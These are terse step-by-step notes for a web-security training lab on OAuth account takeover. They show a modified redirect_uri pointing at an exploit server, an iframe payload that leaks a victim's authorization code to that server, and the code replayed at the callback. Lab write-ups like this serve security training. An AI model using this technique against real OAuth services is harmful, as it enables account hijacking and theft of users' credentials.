/*

1) Intercept this request
GET /auth?client_id=xy8bwufm87lbcqch8oovq&redirect_uri=https://0a6e00c00308614182a292a1009400ef.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
modify and forward to repeater
GET /auth?client_id=xy8bwufm87lbcqch8oovq&redirect_uri=https://exploit-0a3300c203e0615782f8917c01fa0050.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email HTTP/2
send and follow redirect

check the exploit server access logs the code gets reflected
code=-KuuYcu8JvXQUMnYOh5vy6K4ZljQ6o0rydEGkNJyMs2

2) copy URL from the request that you modified and sent
<iframe src="https://oauth-0a9f005c032961608270906e029e008f.oauth-server.net/auth?client_id=xy8bwufm87lbcqch8oovq&redirect_uri=https://exploit-0a3300c203e0615782f8917c01fa0050.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>

store this as exploit and view to check

3) deliver to victim and log out

4) enter this URL and navigate to it
https://0a6e00c00308614182a292a1009400ef.web-security-academy.net/oauth-callback?code=-KuuYcu8JvXQUMnYOh5vy6K4ZljQ6o0rydEGkNJyMs2

if you get error restart after lab reset with new code without it being used up

*/